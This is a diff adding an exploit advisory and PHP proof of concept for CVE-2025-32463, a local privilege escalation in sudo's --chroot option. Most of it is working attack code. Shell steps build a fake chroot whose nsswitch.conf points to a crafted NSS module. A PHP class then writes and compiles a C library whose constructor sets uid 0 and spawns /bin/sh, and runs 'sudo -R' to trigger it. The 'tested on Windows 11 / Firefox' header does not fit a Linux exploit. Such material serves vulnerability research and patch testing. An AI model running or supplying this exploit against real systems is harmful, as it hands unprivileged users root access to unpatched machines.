@@ -1,0 +1,307 @@
+=============================================================================================================================================
+| # Title     : sudo 1.9.17 local Privilege Escalation via Sudo Chroot NSS Module Loading                                                   |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.sudo.ws/                                                                                                        |
+=============================================================================================================================================
+
+POC : 
+
+[+] References : https://packetstorm.news/files/id/212006/ & 	CVE-2025-32463
+
+
+[+] Summary :
+
+CVE-2025-32463 is a local privilege escalation vulnerability in Sudo that allows attackers to execute arbitrary code as root 
+by exploiting the NSS (Name Service Switch) module loading mechanism within a chroot environment. 
+The vulnerability occurs when sudo's --chroot option loads malicious NSS modules from the chroot environment.
+
+The vulnerability exists in sudo's handling of NSS modules when using the --chroot option. When sudo executes a command within a chroot environment, it may load NSS modules from the chroot's library directories rather than the host system. An attacker with local access can create a malicious chroot environment with a crafted NSS module that executes arbitrary code when loaded.
+
+[+] Technical Analysis :
+
+**Vulnerability Mechanism:**
+
+1. Attacker creates a chroot environment with malicious NSS configuration
+2. The nsswitch.conf inside chroot points to a malicious NSS module
+3. When sudo --chroot is executed, it loads the malicious module
+4. The module's constructor function executes with root privileges
+
+**Key Vulnerable Components:**
+
+- Sudo's chroot implementation
+- NSS module loading mechanism
+- Dynamic linker behavior in chroot
+
+[+] Attack Flow :
+
+1. **Create Malicious Chroot Structure**
+
+mkdir -p chtoot/{lib,etc}
+
+
+2. **Write Malicious nsswitch.conf**
+
+echo "passwd: Xfiles" > chtoot/etc/nsswitch.conf
+echo "group: files" >> chtoot/etc/nsswitch.conf
+echo "shadow: files" >> chtoot/etc/nsswitch.conf
+
+
+[+] Usage: php poc.php
+
+[+] POC :
+
+<?php
+/**
+ * PoC for CVE-2025-32463: Local privilege escalation via sudo --chroot
+ * PHP version of the Python exploit
+ * 
+ * Use in lab environments only. Do not run on production systems.
+ */
+
+class SudoChrootExploit {
+    private $chroot = "./chtoot";
+    private $libDir;
+    private $etcDir;
+    private $payloadC = "payload.c";
+    private $libName = "libnss_Xfiles.so.2";
+    private $payloadSo;
+    private $nsswitch;
+    private $verbose = false;
+    
+    public function __construct($verbose = false) {
+        $this->verbose = $verbose;
+        $this->libDir = $this->chroot . "/lib";
+        $this->etcDir = $this->chroot . "/etc";
+        $this->payloadSo = $this->libDir . "/" . $this->libName;
+        $this->nsswitch = $this->etcDir . "/nsswitch.conf";
+    }
+    
+    private function log($msg) {
+        if ($this->verbose) {
+            echo "[*] " . $msg . PHP_EOL;
+        }
+    }
+    
+    private function setupChroot() {
+        echo "[+] Setting up chroot directories..." . PHP_EOL;
+        
+        if (!is_dir($this->libDir)) {
+            mkdir($this->libDir, 0755, true);
+            $this->log("Created directory: " . $this->libDir);
+        }
+        
+        if (!is_dir($this->etcDir)) {
+            mkdir($this->etcDir, 0755, true);
+            $this->log("Created directory: " . $this->etcDir);
+        }
+        
+        $this->log("Chroot structure created successfully");
+    }
+    
+    private function writeNsswitch() {
+        echo "[+] Writing fake nsswitch.conf..." . PHP_EOL;
+        
+        $nsswitchContent = "passwd: Xfiles\n" .
+                          "group:  files\n" .
+                          "shadow: files\n";
+        
+        if (file_put_contents($this->nsswitch, $nsswitchContent) === false) {
+            throw new Exception("Failed to write nsswitch.conf");
+        }
+        
+        $this->log("Written malicious nsswitch.conf to " . $this->nsswitch);
+    }
+    
+    private function writePayload() {
+        echo "[+] Writing payload source..." . PHP_EOL;
+        
+        $payloadCode = '
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <nss.h>
+#include <pwd.h>
+
+__attribute__((constructor)) void init() {
+    unsetenv("LD_PRELOAD");
+    setuid(0);
+    setgid(0);
+    system("/bin/sh");
+}
+
+enum nss_status _nss_Xfiles_getpwnam_r(const char *name, struct passwd *pwd,
+                                       char *buf, size_t buflen, int *errnop) {
+    return NSS_STATUS_NOTFOUND;
+}
+';
+        
+        if (file_put_contents($this->payloadC, $payloadCode) === false) {
+            throw new Exception("Failed to write payload source");
+        }
+        
+        $this->log("Written C payload to " . $this->payloadC);
+    }
+    
+    private function compilePayload() {
+        echo "[+] Compiling malicious libnss module..." . PHP_EOL;
+        
+        $compileCmd = "gcc -fPIC -shared -o " . 
+                      escapeshellarg($this->payloadSo) . " " .
+                      escapeshellarg($this->payloadC) . " -nostartfiles";
+        
+        $this->log("Compilation command: " . $compileCmd);
+        
+        $output = [];
+        $returnCode = 0;
+        exec($compileCmd . " 2>&1", $output, $returnCode);
+        
+        if ($returnCode !== 0) {
+            throw new Exception("Compilation failed: " . implode("\n", $output));
+        }
+        
+        if (!file_exists($this->payloadSo)) {
+            throw new Exception("Compiled library not found: " . $this->payloadSo);
+        }
+        
+        $this->log("Successfully compiled shared object to " . $this->payloadSo);
+    }
+    
+    private function cleanup() {
+        echo "[+] Cleaning up payload source..." . PHP_EOL;
+        
+        if (file_exists($this->payloadC)) {
+            if (unlink($this->payloadC)) {
+                $this->log("Removed " . $this->payloadC);
+            } else {
+                echo "[!] Warning: Failed to remove " . $this->payloadC . PHP_EOL;
+            }
+        }
+    }
+    
+    private function runExploit() {
+        echo "[+] Launching sudo with chroot to trigger exploit..." . PHP_EOL;
+        
+        $sudoCmd = "sudo -R " . escapeshellarg($this->chroot) . " id";
+        $this->log("Executing: " . $sudoCmd);
+        
+        // Method 1: Using system()
+        echo "[*] Attempting exploit via system()..." . PHP_EOL;
+        system($sudoCmd, $returnCode);
+        
+        if ($returnCode !== 0) {
+            // Method 2: Using exec with output
+            echo "[*] Attempting exploit via exec()..." . PHP_EOL;
+            $output = [];
+            exec($sudoCmd, $output, $returnCode);
+            
+            if (!empty($output)) {
+                echo "[*] Command output:" . PHP_EOL;
+                foreach ($output as $line) {
+                    echo "    " . $line . PHP_EOL;
+                }
+            }
+            
+            if ($returnCode !== 0) {
+                echo "[!] Exploit may have failed. Return code: " . $returnCode . PHP_EOL;
+                echo "[!] Check if sudo allows chroot and if gcc is installed" . PHP_EOL;
+            }
+        }
+    }
+    
+    private function checkDependencies() {
+        echo "[+] Checking dependencies..." . PHP_EOL;
+        
+        $dependencies = [
+            'sudo' => 'sudo --version',
+            'gcc' => 'gcc --version',
+        ];
+        
+        foreach ($dependencies as $name => $cmd) {
+            $output = [];
+            $returnCode = 0;
+            exec($cmd . " 2>/dev/null", $output, $returnCode);
+            
+            if ($returnCode === 0) {
+                $this->log("✓ $name is available");
+            } else {
+                throw new Exception("✗ $name is not available or not in PATH");
+            }
+        }
+        
+        $this->log("All dependencies satisfied");
+    }
+    
+    private function showInfo() {
+        echo "=== CVE-2025-32463 Exploit Information ===" . PHP_EOL;
+        echo "Vulnerability: Local privilege escalation via sudo --chroot" . PHP_EOL;
+        echo "Mechanism: Malicious NSS module loading in chroot environment" . PHP_EOL;
+        echo "Target: sudo versions with chroot capability" . PHP_EOL;
+        echo "Effect: Potential root shell execution" . PHP_EOL;
+        echo "==========================================" . PHP_EOL . PHP_EOL;
+    }
+    
+    public function run() {
+        try {
+            $this->showInfo();
+            $this->checkDependencies();
+            $this->setupChroot();
+            $this->writeNsswitch();
+            $this->writePayload();
+            $this->compilePayload();
+            $this->cleanup();
+            $this->runExploit();
+            
+            echo PHP_EOL . "[+] Exploit sequence completed." . PHP_EOL;
+            
+        } catch (Exception $e) {
+            echo "[!] Error: " . $e->getMessage() . PHP_EOL;
+            echo "[!] Exploit failed." . PHP_EOL;
+            exit(1);
+        }
+    }
+    
+    public function __destruct() {
+        // Additional cleanup if needed
+        if (file_exists($this->payloadC)) {
+            unlink($this->payloadC);
+        }
+    }
+}
+
+// Command line argument parsing
+function parseArgs() {
+    $options = getopt("v", ["verbose", "help"]);
+    
+    if (isset($options['help'])) {
+        echo "Usage: php " . basename(__FILE__) . " [OPTIONS]" . PHP_EOL . PHP_EOL;
+        echo "Options:" . PHP_EOL;
+        echo "  -v, --verbose  Enable verbose output for debugging" . PHP_EOL;
+        echo "      --help     Show this help message" . PHP_EOL . PHP_EOL;
+        echo "Description:" . PHP_EOL;
+        echo "  Proof-of-Concept for CVE-2025-32463: Local privilege escalation" . PHP_EOL;
+        echo "  via sudo --chroot using malicious NSS modules." . PHP_EOL . PHP_EOL;
+        echo "Warning:" . PHP_EOL;
+        echo "  Use in lab environments only. Do not run on production systems." . PHP_EOL;
+        exit(0);
+    }
+    
+    return [
+        'verbose' => isset($options['v']) || isset($options['verbose'])
+    ];
+}
+
+// Main execution
+if (php_sapi_name() === 'cli') {
+    $args = parseArgs();
+    $exploit = new SudoChrootExploit($args['verbose']);
+    $exploit->run();
+} else {
+    echo "This script must be run from the command line." . PHP_EOL;
+    exit(1);
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
